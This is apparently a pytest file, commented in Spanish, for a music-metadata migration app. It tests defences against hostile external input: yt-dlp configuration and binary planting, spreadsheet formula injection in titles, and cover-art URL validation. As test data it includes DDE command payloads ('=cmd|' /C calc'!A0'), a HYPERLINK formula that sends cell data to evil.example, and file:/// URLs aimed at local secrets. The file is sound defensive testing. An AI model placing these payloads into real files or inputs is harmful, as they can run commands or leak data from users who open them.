# -*- coding: utf-8 -*-
"""Contenido hostil que entra de afuera. Sin red y sin yt-dlp instalado.

La app muestra y entrega texto que escribió otro (los títulos de YouTube, lo que
responden Deezer y Apple) y corre un programa ajeno (yt-dlp) en la carpeta que
el usuario tenga a mano. Nada de eso tiene que poder ejecutar algo.

  - yt-dlp no lee una configuración ajena ni se busca en la carpeta de trabajo
  - un título con forma de fórmula no se ejecuta al abrir la planilla ni la hoja
  - las portadas se bajan sólo del CDN de Apple, por HTTPS y con tope
"""

import csv
import io
import os
import sys
import types

import openpyxl
import pytest

from conftest import _producto, _track
from migrador import audio as A
from migrador import paquete as Q
from migrador import portadas as PT
from migrador import validar as V
from migrador.texto import parece_formula

# ============================================================
# yt-dlp
# ============================================================


def test_ytdlp_ignora_la_configuracion_de_la_carpeta_de_trabajo():
    """Sin `--ignore-config`, un `yt-dlp.conf` en Descargas con `--exec` corre lo
    que diga al bajar el primer audio."""
    args = A.argumentos_ytdlp("abc123", "/tmp/salida.%(ext)s")
    assert "--ignore-config" in args


def test_la_url_va_despues_de_fin_de_opciones():
    args = A.argumentos_ytdlp("abc123", "/tmp/salida.%(ext)s", js="node")
    assert args[-2] == "--"
    assert args[-1] == "https://www.youtube.com/watch?v=abc123"
    assert args[args.index("--js-runtimes") + 1] == "node"


def test_ytdlp_corre_en_la_carpeta_del_trabajo(monkeypatch, tmp_path):
    visto = {}

    def falso(cmd, **kw):
        visto.update(kw, cmd=cmd)
        (tmp_path / "yt_abc123.webm").write_bytes(b"x")
        return types.SimpleNamespace(returncode=0)

    monkeypatch.setattr(A, "comando_ytdlp", lambda: ["yt-dlp-de-prueba"])
    monkeypatch.setattr(A.subprocess, "run", falso)
    ruta, _etiqueta, fmt = A.bajar_referencia_youtube("abc123", tmp_path, log=lambda *_: None)
    assert visto["cwd"] == str(tmp_path)
    assert visto["cmd"][0] == "yt-dlp-de-prueba"
    assert "--ignore-config" in visto["cmd"]
    assert fmt == ".webm" and ruta is not None


def test_sin_ytdlp_el_motivo_es_claro_y_no_se_corre_nada(monkeypatch, tmp_path):
    monkeypatch.setattr(A, "comando_ytdlp", lambda: None)
    monkeypatch.setattr(A.subprocess, "run", lambda *a, **k: pytest.fail("no tenía que correr nada"))
    errores = []
    assert A.bajar_referencia_youtube("abc", tmp_path, log=lambda *_: None, errores=errores)[0] is None
    assert errores


def test_con_el_modulo_se_usa_el_mismo_interprete(monkeypatch):
    """Antes se detectaba el módulo y se llamaba a un `yt-dlp` del PATH: la
    variante completa, que trae el módulo adentro, fallaba sin él."""
    monkeypatch.setitem(sys.modules, "yt_dlp", types.ModuleType("yt_dlp"))
    monkeypatch.delattr(sys, "frozen", raising=False)
    assert A.comando_ytdlp() == [sys.executable, "-m", "yt_dlp"]


def test_empaquetado_el_ejecutable_se_llama_a_si_mismo(monkeypatch):
    monkeypatch.setitem(sys.modules, "yt_dlp", types.ModuleType("yt_dlp"))
    monkeypatch.setattr(sys, "frozen", True, raising=False)
    assert A.comando_ytdlp() == [sys.executable, A.ARG_YTDLP_EMPAQUETADO]


def test_el_ejecutable_se_busca_solo_en_el_path_y_nunca_en_la_carpeta_de_trabajo(monkeypatch, tmp_path):
    """`shutil.which` antepone la carpeta de trabajo en Windows: un `yt-dlp.exe`
    dejado en Descargas se ejecutaba en lugar del de verdad."""
    plantado = tmp_path / "descargas"
    plantado.mkdir()
    for nombre in ("yt-dlp", "yt-dlp.exe"):
        f = plantado / nombre
        f.write_bytes(b"")
        f.chmod(0o755)
    monkeypatch.chdir(plantado)
    monkeypatch.setenv("PATH", os.pathsep.join([".", "descargas", ""]))
    assert A._buscar_en_path("yt-dlp") is None

    bueno = tmp_path / "bin"
    bueno.mkdir()
    real = bueno / ("yt-dlp.exe" if os.name == "nt" else "yt-dlp")
    real.write_bytes(b"")
    real.chmod(0o755)
    monkeypatch.setenv("PATH", os.pathsep.join([".", str(bueno)]))
    assert A._buscar_en_path("yt-dlp") == str(real)


def test_el_launcher_atiende_el_pedido_de_ytdlp(monkeypatch):
    import launcher

    recibido = {}

    def main(argv):
        recibido["argv"] = argv
        raise SystemExit(0)

    monkeypatch.setitem(sys.modules, "yt_dlp", types.SimpleNamespace(main=main))
    codigo = launcher.correr_ytdlp_empaquetado([A.ARG_YTDLP_EMPAQUETADO, "-f", "bestaudio"])
    assert codigo == 0
    assert recibido["argv"] == ["-f", "bestaudio"]
    assert launcher.correr_ytdlp_empaquetado(["--puerto", "8000"]) is None
    assert launcher.correr_ytdlp_empaquetado([]) is None


# ============================================================
# Fórmulas en las planillas y la hoja de ingesta
# ============================================================

FORMULA = '=HYPERLINK("https://evil.example/?x="&A2,"Ver")'


@pytest.mark.parametrize(
    "texto, es",
    [
        (FORMULA, True),
        ("=cmd|' /C calc'!A0", True),
        ("@SUM(1+1)*cmd|' /C calc'!A0", True),
        ("+cmd|' /C calc'!A0", True),
        ("-2+3+cmd|' /C calc'!A0", True),
        # Nombres reales de discos que no se tocan.
        ("+", False),
        ("=", False),
        ("÷", False),
        ("-Intro-", False),
        ("Tema (En Vivo)", False),
        ("", False),
        (None, False),
    ],
)
def test_que_parece_una_formula(texto, es):
    assert parece_formula(texto) is es


def _producto_hostil():
    return _producto(
        title=FORMULA,
        label="=1+1(",
        tracks=[_track("=cmd|' /C calc'!A0", isrc="ARAAA2000001"), _track("+", isrc="ARAAA2000002")],
    )


def test_en_el_xlsx_una_formula_queda_como_texto():
    wb = openpyxl.load_workbook(io.BytesIO(Q.planilla_maestra_bytes([_producto_hostil()], FORMULA)))
    ws = wb.active
    assert ws is not None
    celdas = [
        c for fila in ws.iter_rows() for c in fila if isinstance(c.value, str) and c.value.startswith("=")
    ]
    assert celdas, "el título tenía que aparecer en la planilla"
    assert all(c.data_type == "s" for c in celdas)


def test_la_planilla_de_producto_tampoco_ejecuta():
    wb = openpyxl.load_workbook(io.BytesIO(Q.planilla_producto_bytes(_producto_hostil(), FORMULA)))
    ws = wb.active
    assert ws is not None
    assert ws["A1"].data_type == "s"


def test_en_el_csv_la_formula_va_con_apostrofo_y_el_nombre_raro_queda_igual():
    filas = list(csv.reader(io.StringIO(Q.hoja_ingesta_csv([_producto_hostil()], FORMULA))))
    cab, datos = filas[0], filas[1:]
    titulo, artista, pista = cab.index("Release Title"), cab.index("Release Artist"), cab.index("Track Title")
    assert all(f[titulo] == "'" + FORMULA for f in datos)
    assert all(f[artista] == "'" + FORMULA for f in datos)
    assert datos[0][pista] == "'=cmd|' /C calc'!A0"
    assert datos[1][pista] == "+"


def test_la_validacion_avisa_que_la_hoja_cambio_el_dato():
    """Tocar el dato en silencio sería otra forma de inventar metadata."""
    res = V.validar([_producto_hostil()])
    hallados = [h for h in res["hallazgos"] if h["codigo"] == "texto_como_formula"]
    assert {h["nivel"] for h in hallados} == {"aviso"}
    assert len(hallados) == 3  # título, sello y un track; el «+» no


# ============================================================
# Portadas
# ============================================================


@pytest.mark.parametrize(
    "url, valida",
    [
        ("https://is1-ssl.mzstatic.com/image/thumb/a/3000x3000bb.jpg", True),
        ("https://IS1-SSL.MZSTATIC.COM/image/thumb/a/3000x3000bb.jpg", True),
        ("http://is1-ssl.mzstatic.com/image/thumb/a/3000x3000bb.jpg", False),
        ("file:///C:/Users/alguien/secreto.png", False),
        ("https://evil.example/3000x3000bb.jpg", False),
        ("https://mzstatic.com.evil.example/3000x3000bb.jpg", False),
        ("https://evilmzstatic.com/3000x3000bb.jpg", False),
        ("", False),
        (None, False),
    ],
)
def test_solo_se_aceptan_portadas_del_cdn_de_apple(url, valida):
    assert PT.url_de_portada_valida(url) is valida


def test_una_url_ajena_no_se_pide(monkeypatch):
    """Antes `file:///...` hacía que urllib leyera un archivo del disco, que
    después terminaba adentro del ZIP."""
    monkeypatch.setattr(PT.urllib.request, "urlopen", lambda *a, **k: pytest.fail("no tenía que pedirse"))
    assert PT.descargar_portada("file:///C:/secreto/100x100bb.png") == (None, 0)
    assert PT.descargar_portada("https://evil.example/a/100x100bb.jpg") == (None, 0)


def test_una_portada_mas_grande_que_el_tope_se_descarta(monkeypatch):
    class Respuesta:
        def __enter__(self):
            return self

        def __exit__(self, *a):
            return False

        def read(self, n=-1):
            return b"\xff\xd8" + b"0" * (n - 2)

    monkeypatch.setattr(PT.urllib.request, "urlopen", lambda *a, **k: Respuesta())
    url = "https://is1-ssl.mzstatic.com/image/thumb/a/100x100bb.jpg"
    assert PT.descargar_portada(url) == (None, 0)
